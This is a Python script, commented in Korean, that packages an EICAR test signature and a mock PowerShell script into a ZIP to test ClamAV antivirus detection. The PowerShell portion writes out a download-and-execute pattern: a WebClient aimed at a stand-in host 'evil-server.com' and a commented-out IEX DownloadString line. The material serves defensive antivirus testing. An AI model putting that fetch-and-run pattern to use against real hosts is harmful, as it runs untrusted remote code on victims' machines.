import zipfile
import os

# 1. 100% 탐지 보장을 위한 EICAR 표준 테스트 서명
EICAR_SIG = r'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

# 2. 파워쉘(PowerShell) 관련 휴리스틱 탐지 포인트입니다.
# - IEX (Invoke-Expression): 문자열을 명령어로 실행하는 함수로, 악성코드에서 자주 쓰입니다.
# - Net.WebClient: 외부 사이트에서 파일을 다운로드할 때 쓰이는 객체입니다.
# - Hidden/Bypass: 실행 정책을 우회하거나 창을 숨기려는 시도는 백신이 매우 의심스럽게 봅니다.
POWERSHELL_SUSPICIOUS = r'''
# PowerShell Heuristic Detection Test Script (IEX Mock)
# ----------------------------------------------------
# [HEURISTIC] 의심스러운 파워쉘 실행 패턴:
$url = "http://evil-server.com/payload.ps1"
$client = New-Object System.Net.WebClient
# 아래와 같이 IEX(Invoke-Expression)를 사용하는 패턴은 백신이 즉시 경고를 발생시킵니다.
# IEX $client.DownloadString($url)

Write-Host "This is a security test script for AWS-ClamAV."
'''

def create_clamav_test03_zip():
    """
    세 번째 테스트 세트로, 파워쉘 기반의 의심 패턴과 고정 서명을 함께 포함합니다.
    스크립트 파일명과 ZIP 파일명을 일치시켜 관리를 용이하게 합니다.
    """
    try:
        # 현재 실행 중인 스크립트 파일명을 가져와서 .py를 .zip으로 바꿉니다.
        script_name = os.path.basename(__file__)
        zip_filename = script_name.replace(".py", ".zip")
        
        # 저장 경로 설정 (현재 스크립트와 동일한 위치)
        current_dir = os.path.dirname(os.path.abspath(__file__))
        zip_filepath = os.path.join(current_dir, zip_filename)

        with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # 보증서: 무조건 탐지되는 EICAR 시그니처 파일
            zipf.writestr("core/signature.txt", EICAR_SIG.encode('ascii'))
            
            # 행위 분석: 파워쉘 의심 패턴 스크립트 파일
            zipf.writestr("scripts/launcher.ps1", POWERSHELL_SUSPICIOUS.encode('utf-8'))
            
        print(f"✅ 생성 완료: {zip_filepath}")
        print(f"📦 생성된 ZIP: {zip_filename} (스크립트 이름과 일치됨)")
        print("💡 탐지 포인트: PowerShell IEX 패턴 + EICAR 서명 복합 구성")
        
    except Exception as e:
        print(f"❌ 오류 발생: {e}")

if __name__ == "__main__":
    create_clamav_test03_zip()
